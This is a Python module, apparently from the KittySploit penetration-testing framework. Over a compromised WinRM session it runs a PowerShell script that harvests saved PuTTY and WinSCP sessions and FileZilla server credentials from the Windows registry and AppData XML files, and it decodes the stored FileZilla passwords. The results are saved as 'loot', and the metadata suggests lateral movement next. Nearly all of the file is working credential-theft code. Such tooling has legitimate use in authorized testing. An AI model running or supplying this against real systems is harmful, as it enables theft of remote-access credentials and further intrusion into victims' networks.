#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin
import re


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Gather PuTTY WinSCP FileZilla",
		"description": "Collect PuTTY, WinSCP, and FileZilla saved sessions through WinRM",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1555/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["remote_access_creds"],
				"suggested_followups": ["post/winrm/manage/lateral_winrm"],
			},
		},
	}

	save_local = OptBool(True, "Save results under ./output", False)

	def _script(self) -> str:
		return r"""
function Decode-FileZillaPass {
  param([string]$Encoded)
  if ([string]::IsNullOrWhiteSpace($Encoded)) { return '' }
  try { return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Encoded)) }
  catch { return $Encoded }
}
function Get-PuttySessions {
  $base = 'HKCU:\Software\SimonTatham\PuTTY\Sessions'
  if (-not (Test-Path -LiteralPath $base)) { return @() }
  Get-ChildItem -LiteralPath $base -ErrorAction SilentlyContinue | ForEach-Object {
    $p = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction SilentlyContinue
    if ($p) {
      [PSCustomObject]@{ Session=$_.PSChildName; HostName=$p.HostName; UserName=$p.UserName; Port=$p.PortNumber; Protocol=$p.Protocol }
    }
  }
}
function Get-WinScpSessions {
  $rows = @()
  foreach ($base in @('HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions','HKCU:\Software\Martin Prikryl\WinSCP\Sessions')) {
    if (-not (Test-Path -LiteralPath $base)) { continue }
    Get-ChildItem -LiteralPath $base -ErrorAction SilentlyContinue | ForEach-Object {
      $p = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction SilentlyContinue
      if ($p) {
        $rows += [PSCustomObject]@{ Session=$_.PSChildName; HostName=$p.HostName; UserName=$p.UserName; Password=$p.Password; Port=$p.PortNumber }
      }
    }
  }
  $rows
}
function Get-FileZillaSites {
  $rows = @()
  foreach ($file in @((Join-Path $env:APPDATA 'FileZilla\recentservers.xml'),(Join-Path $env:APPDATA 'FileZilla\sitemanager.xml'))) {
    if (-not (Test-Path -LiteralPath $file)) { continue }
    try {
      [xml]$xml = Get-Content -LiteralPath $file -ErrorAction Stop
      foreach ($node in $xml.SelectNodes('//Server')) {
        $passNode = $node.SelectSingleNode('Pass')
        $enc = if ($passNode) { $passNode.InnerText } else { '' }
        $rows += [PSCustomObject]@{
          Source=(Split-Path -Leaf $file); Host=$node.SelectSingleNode('Host').InnerText;
          Port=$node.SelectSingleNode('Port').InnerText; User=$node.SelectSingleNode('User').InnerText;
          Password=(Decode-FileZillaPass -Encoded $enc)
        }
      }
    } catch {}
  }
  $rows
}
$sections = New-Object System.Collections.Generic.List[string]
$putty = @(Get-PuttySessions); $winscp = @(Get-WinScpSessions); $fz = @(Get-FileZillaSites)
$sections.Add("=== PuTTY ===`n$(if($putty){$putty|Format-Table -AutoSize|Out-String}else{'(none)'})")
$sections.Add("=== WinSCP ===`n$(if($winscp){$winscp|Format-Table -AutoSize|Out-String}else{'(none)'})")
$sections.Add("=== FileZilla ===`n$(if($fz){$fz|Format-Table -AutoSize|Out-String}else{'(none)'})")
if (($putty.Count + $winscp.Count + $fz.Count) -eq 0) {
  Write-Output 'No PuTTY, WinSCP, or FileZilla session data found.'
} else { $sections -join "`n`n" }
"""

	def run(self):
		try:
			print_status("Collecting PuTTY / WinSCP / FileZilla sessions over WinRM...")
			result = self.winrm_run_encoded_ps(self._script())
			if not result:
				raise ProcedureError(FailureType.Unknown, "No output returned")
			if re.search(r"No PuTTY, WinSCP, or FileZilla session data found", result, re.I):
				print_warning(result)
				return True
			if self._bool_opt(self.save_local, True):
				path = self.winrm_save_loot(result, "winrm_putty_sessions")
				print_success(f"Saved to ./{path}")
			print_success("Session extraction completed")
			print_info(result)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM session dump error: {exc}")
